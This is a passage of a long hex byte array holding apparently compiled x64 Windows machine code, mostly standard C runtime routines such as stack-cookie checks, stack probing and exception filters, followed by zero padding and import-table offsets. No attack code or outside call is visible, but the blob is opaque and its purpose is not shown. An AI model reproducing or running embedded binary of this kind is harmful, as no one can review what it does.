0x3b, 0xd, 0x89, 0xb1, 0x0, 0x0, 0x75, 0x10, 0x48, 0xc1, 0xc1, 0x10, 0x66, 0xf7, 0xc1, 0xff, 0xff, 0x75, 0x1, 0xc3, 0x48, 0xc1, 0xc9, 0x10, 0xe9, 0x3e, 0x0, 0x0, 0x0, 0xcc, 0xcc, 0xe9, 0x8b, 0x3, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x33, 0xc9, 0xff, 0x15, 0xcf, 0x10, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0xbe, 0x10, 0x0, 0x0, 0xff, 0x15, 0x78, 0x11, 0x0, 0x0, 0x48, 0x8b, 0xc8, 0xba, 0x9, 0x4, 0x0, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x48, 0xff, 0x25, 0x74, 0x11, 0x0, 0x0, 0x48, 0x89, 0x4c, 0x24, 0x8, 0x48, 0x83, 0xec, 0x38, 0xb9, 0x17, 0x0, 0x0, 0x0, 0xff, 0x15, 0xa8, 0x10, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x7, 0xb9, 0x2, 0x0, 0x0, 0x0, 0xcd, 0x29, 0x48, 0x8d, 0xd, 0x2e, 0xc8, 0x0, 0x0, 0xe8, 0xc9, 0x1, 0x0, 0x0, 0x48, 0x8b, 0x44, 0x24, 0x38, 0x48, 0x89, 0x5, 0x15, 0xc9, 0x0, 0x0, 0x48, 0x8d, 0x44, 0x24, 0x38, 0x48, 0x83, 0xc0, 0x8, 0x48, 0x89, 0x5, 0xa5, 0xc8, 0x0, 0x0, 0x48, 0x8b, 0x5, 0xfe, 0xc8, 0x0, 0x0, 0x48, 0x89, 0x5, 0x6f, 0xc7, 0x0, 0x0, 0x48, 0x8b, 0x44, 0x24, 0x40, 0x48, 0x89, 0x5, 0x73, 0xc8, 0x0, 0x0, 0xc7, 0x5, 0x49, 0xc7, 0x0, 0x0, 0x9, 0x4, 0x0, 0xc0, 0xc7, 0x5, 0x43, 0xc7, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xc7, 0x5, 0x4d, 0xc7, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xb8, 0x8, 0x0, 0x0, 0x0, 0x48, 0x6b, 0xc0, 0x0, 0x48, 0x8d, 0xd, 0x45, 0xc7, 0x0, 0x0, 0x48, 0xc7, 0x4, 0x1, 0x2, 0x0, 0x0, 0x0, 0xb8, 0x8, 0x0, 0x0, 0x0, 0x48, 0x6b, 0xc0, 0x0, 0x48, 0x8b, 0xd, 0x8d, 0xb0, 0x0, 0x0, 0x48, 0x89, 0x4c, 0x4, 0x20, 0xb8, 0x8, 0x0, 0x0, 0x0, 0x48, 0x6b, 0xc0, 0x1, 0x48, 0x8b, 0xd, 0x70, 0xb0, 0x0, 0x0, 0x48, 0x89, 0x4c, 0x4, 0x20, 0x48, 0x8d, 0xd, 0xfc, 0x86, 0x0, 0x0, 0xe8, 0xff, 0xfe, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x38, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xb9, 0x8, 0x0, 0x0, 0x0, 0xe8, 0x6, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0x89, 0x4c, 0x24, 0x8, 0x48, 0x83, 0xec, 0x28, 0xb9, 0x17, 0x0, 0x0, 0x0, 0xff, 0x15, 0xc1, 0xf, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x8, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0xc8, 0xcd, 0x29, 0x48, 0x8d, 0xd, 0x46, 0xc7, 0x0, 0x0, 0xe8, 0x71, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x44, 0x24, 0x28, 0x48, 0x89, 0x5, 0x2d, 0xc8, 0x0, 0x0, 0x48, 0x8d, 0x44, 0x24, 0x28, 0x48, 0x83, 0xc0, 0x8, 0x48, 0x89, 0x5, 0xbd, 0xc7, 0x0, 0x0, 0x48, 0x8b, 0x5, 0x16, 0xc8, 0x0, 0x0, 0x48, 0x89, 0x5, 0x87, 0xc6, 0x0, 0x0, 0xc7, 0x5, 0x6d, 0xc6, 0x0, 0x0, 0x9, 0x4, 0x0, 0xc0, 0xc7, 0x5, 0x67, 0xc6, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xc7, 0x5, 0x71, 0xc6, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xb8, 0x8, 0x0, 0x0, 0x0, 0x48, 0x6b, 0xc0, 0x0, 0x48, 0x8d, 0xd, 0x69, 0xc6, 0x0, 0x0, 0x8b, 0x54, 0x24, 0x30, 0x48, 0x89, 0x14, 0x1, 0x48, 0x8d, 0xd, 0x4a, 0x86, 0x0, 0x0, 0xe8, 0x4d, 0xfe, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0xd9, 0xff, 0x15, 0xed, 0xe, 0x0, 0x0, 0x48, 0x8b, 0xbb, 0xf8, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x50, 0x48, 0x8b, 0xcf, 0x45, 0x33, 0xc0, 0xff, 0x15, 0xdd, 0xe, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x32, 0x48, 0x83, 0x64, 0x24, 0x38, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x58, 0x48, 0x8b, 0x54, 0x24, 0x50, 0x4c, 0x8b, 0xc8, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x4c, 0x8b, 0xc7, 0x48, 0x8d, 0x4c, 0x24, 0x60, 0x48, 0x89, 0x4c, 0x24, 0x28, 0x33, 0xc9, 0x48, 0x89, 0x5c, 0x24, 0x20, 0xff, 0x15, 0xae, 0xe, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x68, 0x48, 0x83, 0xc4, 0x40, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x56, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0xd9, 0xff, 0x15, 0x7f, 0xe, 0x0, 0x0, 0x48, 0x8b, 0xb3, 0xf8, 0x0, 0x0, 0x0, 0x33, 0xff, 0x45, 0x33, 0xc0, 0x48, 0x8d, 0x54, 0x24, 0x60, 0x48, 0x8b, 0xce, 0xff, 0x15, 0x6d, 0xe, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x39, 0x48, 0x83, 0x64, 0x24, 0x38, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x68, 0x48, 0x8b, 0x54, 0x24, 0x60, 0x4c, 0x8b, 0xc8, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x4c, 0x8b, 0xc6, 0x48, 0x8d, 0x4c, 0x24, 0x70, 0x48, 0x89, 0x4c, 0x24, 0x28, 0x33, 0xc9, 0x48, 0x89, 0x5c, 0x24, 0x20, 0xff, 0x15, 0x3e, 0xe, 0x0, 0x0, 0xff, 0xc7, 0x83, 0xff, 0x2, 0x7c, 0xb1, 0x48, 0x83, 0xc4, 0x40, 0x5f, 0x5e, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x83, 0xec, 0x10, 0x4c, 0x89, 0x14, 0x24, 0x4c, 0x89, 0x5c, 0x24, 0x8, 0x4d, 0x33, 0xdb, 0x4c, 0x8d, 0x54, 0x24, 0x18, 0x4c, 0x2b, 0xd0, 0x4d, 0xf, 0x42, 0xd3, 0x65, 0x4c, 0x8b, 0x1c, 0x25, 0x10, 0x0, 0x0, 0x0, 0x4d, 0x3b, 0xd3, 0x73, 0x16, 0x66, 0x41, 0x81, 0xe2, 0x0, 0xf0, 0x4d, 0x8d, 0x9b, 0x0, 0xf0, 0xff, 0xff, 0x41, 0xc6, 0x3, 0x0, 0x4d, 0x3b, 0xd3, 0x75, 0xf0, 0x4c, 0x8b, 0x14, 0x24, 0x4c, 0x8b, 0x5c, 0x24, 0x8, 0x48, 0x83, 0xc4, 0x10, 0xc3, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0x59, 0x38, 0x48, 0x8b, 0xf2, 0x4d, 0x8b, 0xf0, 0x48, 0x8b, 0xe9, 0x49, 0x8b, 0xd1, 0x48, 0x8b, 0xce, 0x49, 0x8b, 0xf9, 0x4c, 0x8d, 0x43, 0x4, 0xe8, 0x24, 0xfc, 0xff, 0xff, 0x8b, 0x45, 0x4, 0x24, 0x66, 0xf6, 0xd8, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x45, 0x1b, 0xc0, 0x41, 0xf7, 0xd8, 0x44, 0x3, 0xc0, 0x44, 0x85, 0x43, 0x4, 0x74, 0x11, 0x4c, 0x8b, 0xcf, 0x4d, 0x8b, 0xc6, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcd, 0xe8, 0x6c, 0x4e, 0xff, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x8b, 0x7c, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5e, 0xc3, 0xcc, 0xe9, 0xc3, 0x78, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xf8, 0x48, 0x8b, 0xd9, 0xe8, 0x8b, 0x40, 0xff, 0xff, 0xf6, 0x43, 0x4, 0x66, 0x75, 0xd, 0x81, 0x3b, 0x63, 0x73, 0x6d, 0xe0, 0x75, 0x5, 0x83, 0xf8, 0x1, 0x74, 0xb, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xe8, 0x2c, 0x47, 0xff, 0xff, 0x48, 0x89, 0x58, 0x20, 0xe8, 0x23, 0x47, 0xff, 0xff, 0x48, 0x89, 0x78, 0x28, 0xe8, 0x4a, 0x78, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x2b, 0xd1, 0x49, 0x83, 0xf8, 0x8, 0x72, 0x22, 0xf6, 0xc1, 0x7, 0x74, 0x14, 0x66, 0x90, 0x8a, 0x1, 0x3a, 0x4, 0x11, 0x75, 0x2c, 0x48, 0xff, 0xc1, 0x49, 0xff, 0xc8, 0xf6, 0xc1, 0x7, 0x75, 0xee, 0x4d, 0x8b, 0xc8, 0x49, 0xc1, 0xe9, 0x3, 0x75, 0x1f, 0x4d, 0x85, 0xc0, 0x74, 0xf, 0x8a, 0x1, 0x3a, 0x4, 0x11, 0x75, 0xc, 0x48, 0xff, 0xc1, 0x49, 0xff, 0xc8, 0x75, 0xf1, 0x48, 0x33, 0xc0, 0xc3, 0x1b, 0xc0, 0x83, 0xd8, 0xff, 0xc3, 0x90, 0x49, 0xc1, 0xe9, 0x2, 0x74, 0x37, 0x48, 0x8b, 0x1, 0x48, 0x3b, 0x4, 0x11, 0x75, 0x5b, 0x48, 0x8b, 0x41, 0x8, 0x48, 0x3b, 0x44, 0x11, 0x8, 0x75, 0x4c, 0x48, 0x8b, 0x41, 0x10, 0x48, 0x3b, 0x44, 0x11, 0x10, 0x75, 0x3d, 0x48, 0x8b, 0x41, 0x18, 0x48, 0x3b, 0x44, 0x11, 0x18, 0x75, 0x2e, 0x48, 0x83, 0xc1, 0x20, 0x49, 0xff, 0xc9, 0x75, 0xcd, 0x49, 0x83, 0xe0, 0x1f, 0x4d, 0x8b, 0xc8, 0x49, 0xc1, 0xe9, 0x3, 0x74, 0x9b, 0x48, 0x8b, 0x1, 0x48, 0x3b, 0x4, 0x11, 0x75, 0x1b, 0x48, 0x83, 0xc1, 0x8, 0x49, 0xff, 0xc9, 0x75, 0xee, 0x49, 0x83, 0xe0, 0x7, 0xeb, 0x83, 0x48, 0x83, 0xc1, 0x8, 0x48, 0x83, 0xc1, 0x8, 0x48, 0x83, 0xc1, 0x8, 0x48, 0x8b, 0xc, 0xa, 0x48, 0xf, 0xc8, 0x48, 0xf, 0xc9, 0x48, 0x3b, 0xc1, 0x1b, 0xc0, 0x83, 0xd8, 0xff, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xe0, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0x25, 0xea, 0xd, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x8a, 0x4d, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0x7e, 0x34, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x8a, 0x4d, 0x20, 0xe8, 0x6c, 0x34, 0xff, 0xff, 0x90, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0xcd, 0x32, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x1, 0x8b, 0x10, 0x48, 0x89, 0x4c, 0x24, 0x28, 0x89, 0x54, 0x24, 0x20, 0x4c, 0x8d, 0xd, 0x2, 0x2d, 0xff, 0xff, 0x4c, 0x8b, 0x45, 0x70, 0x8b, 0x55, 0x68, 0x48, 0x8b, 0x4d, 0x60, 0xe8, 0xe, 0x32, 0xff, 0xff, 0x90, 0x48, 0x83, 0xc4, 0x30, 0x5d, 0xc3, 0xcc, 0x40, 0x55, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x1, 0x33, 0xc9, 0x81, 0x38, 0x5, 0x0, 0x0, 0xc0, 0xf, 0x94, 0xc1, 0x8b, 0xc1, 0x5d, 0xc3, 0xcc, 0x40, 0x53, 0x55, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0xea, 0x48, 0x89, 0x4d, 0x38, 0x48, 0x89, 0x4d, 0x30, 0x80, 0x7d, 0x58, 0x0, 0x74, 0x6c, 0x48, 0x8b, 0x45, 0x30, 0x48, 0x8b, 0x8, 0x48, 0x89, 0x4d, 0x28, 0x48, 0x8b, 0x45, 0x28, 0x81, 0x38, 0x63, 0x73, 0x6d, 0xe0, 0x75, 0x55, 0x48, 0x8b, 0x45, 0x28, 0x83, 0x78, 0x18, 0x4, 0x75, 0x4b, 0x48, 0x8b, 0x45, 0x28, 0x81, 0x78, 0x20, 0x20, 0x5, 0x93, 0x19, 0x74, 0x1a, 0x48, 0x8b, 0x45, 0x28, 0x81, 0x78, 0x20, 0x21, 0x5, 0x93, 0x19, 0x74, 0xd, 0x48, 0x8b, 0x45, 0x28, 0x81, 0x78, 0x20, 0x22, 0x5, 0x93, 0x19, 0x75, 0x24, 0xe8, 0xf5, 0x44, 0xff, 0xff, 0x48, 0x8b, 0x4d, 0x28, 0x48, 0x89, 0x48, 0x20, 0x48, 0x8b, 0x45, 0x30, 0x48, 0x8b, 0x58, 0x8, 0xe8, 0xe0, 0x44, 0xff, 0xff, 0x48, 0x89, 0x58, 0x28, 0xe8, 0x7, 0x76, 0xff, 0xff, 0x90, 0xc7, 0x45, 0x20, 0x0, 0x0, 0x0, 0x0, 0x8b, 0x45, 0x20, 0x48, 0x83, 0xc4, 0x28, 0x5d, 0x5b, 0xc3, 0xcc, 0x40, 0x53, 0x55, 0x48, 0x83, 0xec, 0x48, 0x48, 0x8b, 0xea, 0x48, 0x89, 0x4d, 0x50, 0x48, 0x89, 0x4d, 0x48, 0xe8, 0xad, 0x44, 0xff, 0xff, 0x48, 0x8b, 0x8d, 0x80, 0x0, 0x0, 0x0, 0x48, 0x89, 0x48, 0x70, 0x48, 0x8b, 0x45, 0x48, 0x48, 0x8b, 0x8, 0x48, 0x8b, 0x59, 0x38, 0xe8, 0x92, 0x44, 0xff, 0xff, 0x48, 0x89, 0x58, 0x68, 0x48, 0x8b, 0x4d, 0x48, 0xc6, 0x44, 0x24, 0x38, 0x1, 0x48, 0x83, 0x64, 0x24, 0x30, 0x0, 0x83, 0x64, 0x24, 0x28, 0x0, 0x48, 0x8b, 0x85, 0xa0, 0x0, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4c, 0x8b, 0x8d, 0x98, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0x85, 0x90, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x95, 0x88, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x9, 0xe8, 0x5d, 0x5b, 0xff, 0xff, 0xe8, 0x4c, 0x44, 0xff, 0xff, 0x48, 0x83, 0x60, 0x70, 0x0, 0xc7, 0x45, 0x40, 0x1, 0x0, 0x0, 0x0, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x48, 0x5d, 0x5b, 0xc3, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x48, 0x89, 0x4d, 0x58, 0x4c, 0x8d, 0x45, 0x20, 0x48, 0x8b, 0x95, 0xb8, 0x0, 0x0, 0x0, 0xe8, 0x2e, 0x60, 0xff, 0xff, 0x90, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3, 0xcc, 0x40, 0x53, 0x55, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x4d, 0x38, 0xe8, 0x33, 0x4a, 0xff, 0xff, 0x83, 0x7d, 0x20, 0x0, 0x75, 0x3a, 0x48, 0x8b, 0x9d, 0xb8, 0x0, 0x0, 0x0, 0x81, 0x3b, 0x63, 0x73, 0x6d, 0xe0, 0x75, 0x2b, 0x83, 0x7b, 0x18, 0x4, 0x75, 0x25, 0x8b, 0x43, 0x20, 0x2d, 0x20, 0x5, 0x93, 0x19, 0x83, 0xf8, 0x2, 0x77, 0x18, 0x48, 0x8b, 0x4b, 0x28, 0xe8, 0x56, 0x40, 0xff, 0xff, 0x85, 0xc0, 0x74, 0xb, 0xb2, 0x1, 0x48, 0x8b, 0xcb, 0xe8, 0xd4, 0x3f, 0xff, 0xff, 0x90, 0xe8, 0xb6, 0x43, 0xff, 0xff, 0x48, 0x8b, 0x8d, 0xc0, 0x0, 0x0, 0x0, 0x48, 0x89, 0x48, 0x20, 0xe8, 0xa6, 0x43, 0xff, 0xff, 0x48, 0x8b, 0x4d, 0x40, 0x48, 0x89, 0x48, 0x28, 0x48, 0x83, 0xc4, 0x28, 0x5d, 0x5b, 0xc3, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0xe8, 0x68, 0x40, 0xff, 0xff, 0x90, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0xe8, 0x72, 0x43, 0xff, 0xff, 0x83, 0x78, 0x30, 0x0, 0x7e, 0x8, 0xe8, 0x67, 0x43, 0xff, 0xff, 0xff, 0x48, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x45, 0x48, 0x8b, 0x8, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0xe4, 0x7e, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x48, 0x89, 0x4d, 0x28, 0x48, 0x8b, 0x1, 0x8b, 0x8, 0x89, 0x4d, 0x24, 0x33, 0xc0, 0x81, 0xf9, 0x63, 0x73, 0x6d, 0xe0, 0xf, 0x94, 0xc0, 0x89, 0x45, 0x20, 0x8b, 0x45, 0x20, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x45, 0x68, 0x8b, 0x8, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0x9d, 0x7e, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0xb9, 0x5, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0x84, 0x7e, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0xb9, 0x7, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0x6b, 0x7e, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x33, 0xc9, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0x55, 0x7e, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x80, 0x7d, 0x70, 0x0, 0x74, 0xb, 0xb9, 0x3, 0x0, 0x0, 0x0, 0xe8, 0x3b, 0x7e, 0xff, 0xff, 0x90, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x4d, 0x48, 0x48, 0x8b, 0x9, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0x91, 0xb0, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x85, 0x98, 0x0, 0x0, 0x0, 0x8b, 0x8, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0xfc, 0x7d, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x45, 0x58, 0x8b, 0x8, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0xe2, 0x7d, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0xb9, 0x4, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0xc9, 0x7d, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x45, 0x48, 0x8b, 0x8, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0x6b, 0xca, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xea, 0x8b, 0x4d, 0x60, 0x48, 0x83, 0xc4, 0x30, 0x5d, 0xe9, 0x54, 0xca, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0xb9, 0x8, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0x7f, 0x7d, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x4d, 0x40, 0x48, 0x83, 0xc4, 0x30, 0x5d, 0xe9, 0xdf, 0xaf, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x1, 0x81, 0x38, 0x5, 0x0, 0x0, 0xc0, 0x74, 0xc, 0x81, 0x38, 0x1d, 0x0, 0x0, 0xc0, 0x74, 0x4, 0x33, 0xc0, 0xeb, 0x5, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x1, 0x33, 0xc9, 0x81, 0x38, 0x5, 0x0, 0x0, 0xc0, 0xf, 0x94, 0xc1, 0x8b, 0xc1, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3, 0xcc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x9e, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc2, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd2, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe4, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf4, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x16, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2c, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3c, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4c, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5e, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8e, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa4, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xbe, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd4, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x16, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2a, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x46, 0x81, 0x1, 